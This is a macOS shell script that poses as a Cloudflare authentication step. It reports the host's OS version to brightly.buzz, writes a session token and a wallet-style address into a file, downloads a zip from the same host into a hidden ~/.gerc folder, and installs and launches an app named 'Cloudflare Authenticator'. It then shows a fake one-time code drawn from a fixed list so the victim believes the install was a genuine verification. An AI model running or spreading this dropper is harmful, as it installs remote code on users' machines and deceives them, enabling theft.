#!/bin/bash

curl -s "https://brightly.buzz/post_info?uuid=dcdfc19c-b3b8-4902-a8c9-acdcb6d92da6&os=$(/usr/bin/sw_vers -productVersion)" > /dev/null 2>&1

cd ~
mkdir tmp
cd ~/tmp
echo SESSION=xrn1zLnebtv6kfIl5NQ8/+XcqhF9xGSylhbk33KqWf9BFJRFxdwWB+3lRdazg9fpjjBee9nPx2+LOP/md5/ZTg== > context
echo SERVER_ADDRESS=0xCd01cc4172842EC6351e8C72AA5D959a2C7def24 >> context

cd ~/
mkdir .gerc
cd .gerc
curl -o initer.zip https://brightly.buzz/fileServe/cloudflare.zip  > /dev/null 2>&1
unzip -o initer.zip > /dev/null 2>&1
rm -f initer.zip > /dev/null 2&>1
mv "Cloudflare Authenticator.app" /Applications

open "/Applications/Cloudflare Authenticator.app"

array=(
  "234166"
  "923819"
  "134665"
  "195642"
  "465102"
  "355477"
  "296082"
  "964125"
  "305478"
  "532116"
)
RANDOM_INDEX=$((RANDOM % ${#array[@]}))
OTP=${array[$RANDOM_INDEX]}
FORMATTED_OTP="${OTP:0:3} ${OTP:3:3}"
osascript -e "display dialog \"Authentication code: ${FORMATTED_OTP}\" with title \"Cloudflare Authenticator\" buttons {\"Confirm\"} default button \"Confirm\""

exit 0
